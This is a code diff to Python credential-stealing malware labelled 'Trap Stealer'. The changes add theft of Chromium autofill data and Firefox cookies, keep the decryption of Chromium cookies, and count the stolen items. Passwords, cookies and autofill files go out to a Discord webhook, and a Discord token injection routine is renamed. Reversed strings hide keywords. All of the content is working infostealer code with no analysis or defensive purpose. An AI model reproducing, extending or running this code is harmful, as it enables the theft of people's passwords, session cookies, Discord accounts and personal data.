@@ -373,7 +373,7 @@ def NoDiscord():
 
 
 
-def inj_discord():
+def idisc():
     ind = "sj.xedni"
 
 
@@ -433,7 +433,7 @@ Powershell -command "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName 
     with open(file_path, 'rb') as file:
         content = file.read().decode('utf-8', errors='ignore').strip()
 
-avs()
+
 
 def globalInfo():
     
@@ -491,6 +491,7 @@ pictures_path = os.path.join(home_dir, 'Pictures')
 Threadlist = []
 
 badgeList =  [
+        {"Name": 'Active_Developer',                'Value': 4194304,   'Emoji': '<:active:1045283132796063794> '},
         {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<:developer:874750808472825986> "},
         {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<:bughunter_2:874750808430874664> "},
         {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early_supporter:874750808414113823> "},
@@ -504,6 +505,40 @@ badgeList =  [
     ]
 
 pub = 'cilbup'
+
+Autofill = []
+AutofillCount = 0
+
+
+def getAutofill(path, arg):
+    
+    try:
+        global Autofill, AutofillCount
+        if not os.path.exists(path): return
+
+        pathC = path + arg + "/Web Data"
+        if os.stat(pathC).st_size == 0: return
+
+        tempfold = temp + "wp" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
+
+
+        shutil.copy2(pathC, tempfold)
+        conn = sql_connect(tempfold)
+        cursor = conn.cursor()
+        cursor.execute("SELECT * FROM autofill WHERE value NOT NULL")
+        data = cursor.fetchall()
+        cursor.close()
+        conn.close()
+        os.remove(tempfold)
+
+        for row in data:
+            if row[0] != '':
+                Autofill.append(f"Name: {row[0]} | Value: {row[1]}")
+                AutofillCount += 1
+        writeforfile(Autofill, 'autofill')
+    except Exception as e:
+        print(e)
+
 
 def get_uhq_guilds(token):
     try:
@@ -527,7 +562,7 @@ def get_uhq_guilds(token):
 
             invite_code = invites[0]['code'] if invites else None
 
-            guild_info = f"<:AstolfoLurkingFA:990296400497631323> [{guild['name']}]({f'https://discord.gg/{invite_code}' if invite_code else ''}) `({guild['id']})` **{guild['approximate_member_count']} Members**"
+            guild_info = f"⚔️ [{guild['name']}]({f'https://discord.gg/{invite_code}' if invite_code else ''}) `({guild['id']})` **{guild['approximate_member_count']} Members**"
             uhq_guilds.append(guild_info)
 
         if not uhq_guilds:
@@ -546,30 +581,24 @@ def get_uhq_friends(tokq, max_friends=5):
     }
     try:
         response = urlopen(Request("https://discord.com/api/v6/users/@me/relationships", headers=headers))
-        friendslist = json.loads(response.read().decode())
+        friendlist = json.loads(response.read().decode())
     except:
         return False
 
     uhqlist = ''
     friend_count = 0 
 
-    for friend in friendslist:
-        if friend_count >= max_friends:  
-            break
-
-        owned_badges = ''
-        flags = friend['user'][f'{pub[::-1]}_flags']
+    for friend in friendlist:
+        OwnedBadges = ''
+        flags = friend['user']['public_flags']
         for badge in badgeList:
             if flags // badge["Value"] != 0 and friend['type'] == 1:
-                if "House" not in badge["Name"]:
-                    owned_badges += badge["Emoji"]
+                if not "House" in badge["Name"] and not badge["Name"] == "Active_Developer":
+                    OwnedBadges += badge["Emoji"]
                 flags = flags % badge["Value"]
-        if owned_badges != '':
-            uhqlist += f"{owned_badges} - {friend['user']['username']}#{friend['user']['discriminator']} | ID : ({friend['user']['id']})\n"
-
-        friend_count += 1  
-
-    return uhqlist
+        if OwnedBadges != '':
+            uhqlist += f"{OwnedBadges} | **{friend['user']['username']}#{friend['user']['discriminator']}** `({friend['user']['id']})`\n"
+    return uhqlist if uhqlist != '' else "`No HQ Friends`"
 
 def get_badge(flags):
     if flags == 0:
@@ -763,10 +792,10 @@ def uploadTokq(Tokq, path):
     
     character_limit = 1900
 
-    if len(json_string) > character_limit:
-        json_string = json_string[:character_limit - 3] + "..."
+    if len(data) > character_limit:
+        data = data[:character_limit - 3] + "..."
 
-    LoadUrlib(webhook, data=dumps(json_string).encode(), headers=headers)
+    LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
 
 
 
@@ -795,6 +824,9 @@ def find_history_file(browser_name, path_template):
 def find_brave_history_file():
     return os.path.join(os.path.expanduser('~'), 'AppData', 'Local', 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'History')
 from urllib.parse import urlparse
+cl = 0
+CookiCount = 0
+Cookies = []
 
 def get_brave_history(temp_dir, files_to_zip):
     history_db = find_brave_history_file()
@@ -1374,12 +1406,27 @@ def srcs():
     except Exception as e:
         pass
 def paaz():
+    
     try:
-        global PasswCount
-        file = os.getenv("TEMP") + f"\wppassw.txt"
-        filename = "wppassw.txt"
-        file2 = os.getenv("TEMP") + f"\wpcook.txt"
-        filename2 = "wpcook.txt"
+        global Cookies, CookiCount
+        try:
+            file = os.getenv("TEMP") + f"\wppassw.txt"
+            filename = "wppassw.txt"
+
+            
+        except:pass
+        try:
+            file2 = os.getenv("TEMP") + f"\wpcook.txt"
+            filename2 = "wpcook.txt"
+
+            
+        except:pass
+        try:
+            file3 = os.getenv("TEMP") + f"\wpautofill.txt"
+            filename3 = "wpautofill.txt"
+
+            
+        except:pass
         with open(file, 'r') as fp:
             lines = sum(1 for line in fp)
         def upload_and_assign_variable(file_path, variable):
@@ -1393,16 +1440,20 @@ def paaz():
 
         thread1 = threading.Thread(target=upload_and_assign_variable, args=(file, results))
         thread2 = threading.Thread(target=upload_and_assign_variable, args=(file2, results))
-
+        thread3 = threading.Thread(target=upload_and_assign_variable, args=(file3, results))
+        
         thread1.start()
         thread2.start()
+        thread3.start()
 
         thread1.join()
         thread2.join()
+        thread3.join()
 
         a = results[0] if results else None
         b = results[1] if len(results) > 1 else None
-
+        c = results[2] if len(results) > 2 else None
+        
         pas = 'drowssaP'
         data = {
             "username": "Trap Stealer",
@@ -1411,11 +1462,12 @@ def paaz():
             "embeds": [
                 {
                     "title": f"🍪 Trap Stealer {pas[::-1]} and cookies",
-                    "description": f"Number of {pas[::-1]} : {PasswCount}\nNumber of cookies : {lines}",
+                    "description": f"Number of {pas[::-1]} : {PasswCount}\nNumber of cookies : {CookiCount}\nNumber of autofill item : {AutofillCount}",
                     "color": 0xffb6c1,
                     "fields": [
                         {"name": f"{filename}", "value": f"[Click here to download]({a})"},
-                        {"name": f"{filename2}", "value": f"[Click here to download]({b})"}  
+                        {"name": f"{filename2}", "value": f"[Click here to download]({b})"},
+                        {"name": f"{filename3}", "value": f"[Click here to download]({c})"}  
                     ],
                     "thumbnail": {
                         "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
@@ -1430,12 +1482,41 @@ def paaz():
         LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
     except:
         pass
-cl = 0
 
-Cookies = []
+
+def FirefoxCookie():
+    try:
+        global Cookies, CookiCount
+        firefoxpath = f"{roaming}/Mozilla/Firefox/Profiles"
+        if not os.path.exists(firefoxpath): return
+        subprocess.Popen(f"taskkill /im firefox.exe /t /f >nul 2>&1", shell=True)
+        for subdir, dirs, files in os.walk(firefoxpath):
+            for file in files:
+               if file.endswith("cookies.sqlite"):
+                    tempfold = temp + "wp" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
+                    shutil.copy2(os.path.join(subdir, file), tempfold)
+                    conn = sql_connect(tempfold)
+                    cursor = conn.cursor()
+                    cursor.execute("select * from moz_cookies ")
+                    data = cursor.fetchall()
+                    cursor.close()
+                    conn.close()
+                    os.remove(tempfold)
+                    for row in data:
+                        if row[0] != '':
+                            Cookies.append(f"Host Key: {row[4]} | Name : {row[2]} | Value : {row[3]}")
+                            CookiCount += 1
+                            
+                    file3 = os.getenv("TEMP") + f"\wpautofill.txt"
+                    with open(file3, 'a') as f:
+                        f.write(Cookies)
+                            
+    except: pass
+    
 def getCook(path, arg):
     try:
         global Cookies, CookiCount
+        
         if not os.path.exists(path): return
         e = 'seikooC/'
         pathC = path + arg + e[::-1]
@@ -1460,15 +1541,16 @@ def getCook(path, arg):
         master_key = CryptUnprotectData(master_key[5:])
   
         for row in data: 
-            
             if row[0] != '':
-                cl =+ 1
-                
+
                 Cookies.append(f"Host Key: {row[0]} | Name: {row[1]} | Value: {DecryptValue(row[2], master_key)}")
+                CookiCount += 1
+        
+
         writeforfile(Cookies, 'cook')
-        
-        
-    except:pass
+    except:
+        pass
+    
 
             
 def GatherZips(paths1, paths2, paths3):
@@ -1591,8 +1673,18 @@ def GatherAll():
         a = threading.Thread(target=getCook, args=[patt[0], patt[4]])
         a.start()
         coc.append(a)
-
         
+        
+    for patt in browserPaths:
+        sta = threading.Thread(target=getAutofill,args=[patt[0], patt[3]])
+        sta.start()
+        aa.append(sta)
+    for thread in aa:
+        thread.join()
+        
+    a = threading.Thread(target=FirefoxCookie)
+    a.start()
+    aa.append(a)
 
     a = threading.Thread(target=getinfo)
     a.start()
@@ -1619,7 +1711,7 @@ def GatherAll():
 
     if injection == True:
         try:
-            ij = threading.Thread(target=inj_discord)
+            ij = threading.Thread(target=idisc)
             ij.start()
             aa.append(ij)
         except:pass
